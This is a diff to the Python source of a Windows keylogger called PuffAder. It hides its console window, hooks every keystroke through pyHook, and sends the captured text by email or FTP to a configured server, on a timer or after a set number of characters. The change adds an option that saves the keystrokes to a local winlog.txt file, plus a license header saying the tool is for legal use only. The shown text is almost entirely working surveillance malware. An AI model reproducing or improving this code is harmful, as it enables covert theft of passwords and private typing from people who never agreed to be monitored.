@@ -1,7 +1,16 @@
+'''
+PuffAder Windows Keylogger by xp4xbox
+https://github.com/xp4xbox/Puffader
+
+Copyright (c) 2017 xp4xbox
+MIT License: https://github.com/xp4xbox/Puffader/blob/master/LICENSE
+
+NOTE: This program must be used for legal purposes only!
+'''
+
 import smtplib, time, os, threading, sys, subprocess
 import win32console, win32gui, win32event, win32api, winerror
-from win32con import VK_CAPITAL; from sys import exit
-from ftplib import FTP
+from win32con import VK_CAPITAL; from sys import exit; from ftplib import FTP
 try:
     import pythoncom, pyHook
     from pyHook import GetKeyState, HookConstants
@@ -19,11 +28,12 @@ strFtpUser = ""
 strFtpPass = ""
 strFtpRemotePath = "/"
 
-intCharPerSend = 1000  # set num of chars before send log
+intCharPerSend = 1000  # set num of chars before send log/store
 
-blnUseTime = "False"  # if you prefer to use a timer to send logs, set this to True
-strTimePerSend = 120  # set how often to send logs in seconds
+blnUseTime = "False"  # if you prefer to use a timer for sending/storing, set this to True
+strTimePerSend = 120  # set how often to send/store logs in seconds
 
+blnStoreLocal = "False"  # True to save logs locally to winlog.txt instead
 blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace
 
 def hide():
@@ -93,10 +103,24 @@ def OnKeyboardEvent(event):
         except:
             os._exit(1)
 
+    def StoreMessagesLocal(strLogs, blnStop):
+        # log keys locally to winlog.txt
+        if os.path.isfile("winlog.txt"):
+            objLogFile = open("winlog.txt", 'a')
+        else:
+            objLogFile = open("winlog.txt", 'w')
+        if blnStop == "True":
+            objLogFile.write("\n\n""Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
+        else:
+            objLogFile.write("\n\n""Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
+        objLogFile.write(strLogs); objLogFile.close()
+
     if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
         # CTRL-RIGHT_SHIFT-H to stop the program
-        # create a new thread so that there is no delay while sending email
-        if blnFTP == "True":
+        if blnStoreLocal == "True":
+            StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=(strLogs, "True"))
+            StoreLogThread.start()
+        elif blnFTP == "True":
             SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, "True"))
             SendFTPThread.start()
         else:
@@ -135,9 +159,12 @@ def OnKeyboardEvent(event):
             # since event.Key outputs all keys as uppercase, lower normal ones
             strLogs = strLogs + ((event.Key).lower())
 
-    def CreateNewThreadMail():  # function for creating thread for sending messages
+    def CreateNewThreadMessages():  # function for creating thread for sending messages
         if not strLogs == "":  # if the log is not empty
-            if blnFTP == "True":
+            if blnStoreLocal == "True":
+                StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=(strLogs, blnStop))
+                StoreLogThread.start()
+            elif blnFTP == "True":
                 SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop))
                 SendFTPThread.start()
             else:
@@ -146,12 +173,12 @@ def OnKeyboardEvent(event):
 
     if blnUseTime == "True":  # if the user is sending messages by timer
         if not objTimer.is_alive():  # check to see if the timer is not active
-            objTimer = threading.Timer(strTimePerSend, CreateNewThreadMail)
+            objTimer = threading.Timer(strTimePerSend, CreateNewThreadMessages)
             objTimer.start()
             strLogs = ""
     else:
-        if len(strLogs) >= intCharPerSend:  # send message if log is certain length
-            CreateNewThreadMail()
+        if len(strLogs) >= intCharPerSend:  # send/save message if log is certain length
+            CreateNewThreadMessages()
             strLogs = ""
     return True
 
